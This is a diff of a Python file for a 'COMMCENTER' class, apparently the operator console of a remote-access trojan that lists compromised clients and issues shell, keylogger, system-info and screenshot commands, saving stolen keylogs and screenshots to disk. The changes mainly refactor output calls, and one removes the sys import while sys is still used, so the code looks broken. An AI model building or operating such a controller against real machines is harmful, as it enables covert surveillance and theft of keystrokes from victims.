@@ -1,41 +1,39 @@
-import os
+
 import subprocess
-import sys
-import tabulate
 from datetime import datetime
 
-from common.output import output
+from common.output import *
 
 
 class COMMCENTER:
     CLIENTS = []
     COUNTER = 0
-    CURRENT = ()  #### Current Target Client ####
+    CURRENT = ()
     KEYLOGS = []
 
     def c_help(self, vals):
         if len(vals) > 1:
             if vals[1] == "sessions":
-                output.help_c_sessions()
+                help_c_sessions()
             elif vals[1] == "connect":
-                output.help_c_connect()
+                help_c_connect()
             elif vals[1] == "disconnect":
-                output.help_c_disconnect()
+                help_c_disconnect()
             elif vals[1] == "clear":
-                output.help_c_clear()
+                help_c_clear()
             elif vals[1] == "shell":
-                output.help_c_shell()
+                help_c_shell()
             elif vals[1] == "keylogger":
-                output.help_c_keylogger()
+                help_c_keylogger()
             elif vals[1] == "sysinfo":
-                output.help_c_sysinfo()
+                help_c_sysinfo()
             elif vals[1] == "screenshot":
-                output.help_c_screenshot()
+                help_c_screenshot()
         else:
             if self.CURRENT:
-                output.help_c_current()
+                help_c_current()
             else:
-                output.help_c_general()
+                help_c_general()
 
     def get_valid(self, _id):
         for client in self.CLIENTS:
@@ -54,11 +52,11 @@ class COMMCENTER:
                 self.CURRENT = tgt
             else:
                 sys.stdout.write("\n")
-                output.print_red("No client is associated with that ID!")
+                print_red("No client is associated with that ID!")
                 sys.stdout.write("\n")
         else:
             sys.stdout.write("\n")
-            output.print_red("Invalid Syntax!")
+            print_red("Invalid Syntax!")
             sys.stdout.write("\n")
 
     def c_disconnect(self):
@@ -66,16 +64,16 @@ class COMMCENTER:
 
     def c_sessions(self):
         headers = (
-            output.BOLD + 'ID' + output.END, output.BOLD + 'IP Address' + output.END, output.BOLD + 'Incoming Port' + output.END,
-            output.BOLD + 'Status' + output.END)
+            BOLD + 'ID' + END, BOLD + 'IP Address' + END, BOLD + 'Incoming Port' + END,
+            BOLD + 'Status' + END)
         lister = []
 
         for client in self.CLIENTS:
             toappend = []
-            toappend.append(output.RED + str(client[0]) + output.END)
-            toappend.append(output.DARKCYAN + client[1].ip + output.END)
-            toappend.append(output.BLUE + str(client[1].port) + output.END)
-            toappend.append(output.GREEN + client[1].STATUS + output.END)
+            toappend.append(RED + str(client[0]) + END)
+            toappend.append(DARKCYAN + client[1].ip + END)
+            toappend.append(BLUE + str(client[1].port) + END)
+            toappend.append(GREEN + client[1].STATUS + END)
             lister.append(toappend)
 
         sys.stdout.write("\n")
@@ -100,7 +98,7 @@ class COMMCENTER:
                         break
         else:
             sys.stdout.write("\n")
-            output.print_red("You need to connect before execute this command!")
+            print_red("You need to connect before execute this command!")
             sys.stdout.write("\n")
 
     def c_clear(self):
@@ -137,14 +135,14 @@ class COMMCENTER:
                     fl = open(fullpath, 'w')
                     fl.write(result)
                     fl.close()
-                    output.print_green("Dumped: [" + output.GREEN + fullpath + output.END + "]")
+                    print_green("Dumped: [" + GREEN + fullpath + END + "]")
 
                 else:
-                    output.print_red("Invalid Syntax!")
+                    print_red("Invalid Syntax!")
             else:
-                output.print_red("Invalid Syntax!")
+                print_red("Invalid Syntax!")
         else:
-            output.print_red("You need to connect before execute this command!")
+            print_red("You need to connect before execute this command!")
 
     def c_sysinfo(self):
         if self.CURRENT:
@@ -153,7 +151,7 @@ class COMMCENTER:
             if result.strip(" "):
                 print(result)
         else:
-            output.print_red("You need to connect before execute this command!")
+            print_red("You need to connect before execute this command!")
 
     def c_screenshot(self):
         if self.CURRENT:
@@ -170,10 +168,10 @@ class COMMCENTER:
             fl = open(fullpath, 'wb')
             fl.write(result)
             fl.close()
-            output.print_green("Saved: [" + output.DARKCYAN + fullpath + output.END + "]")
+            print_green("Saved: [" + DARKCYAN + fullpath + END + "]")
         else:
-            output.print_red("You need to connect before execute this command!")
+            print_red("You need to connect before execute this command!")
 
     def c_exit(self):
         sys.stdout.write("\n")
-        output.print_red("See Ya!\n")
+        print_red("See Ya!\n")
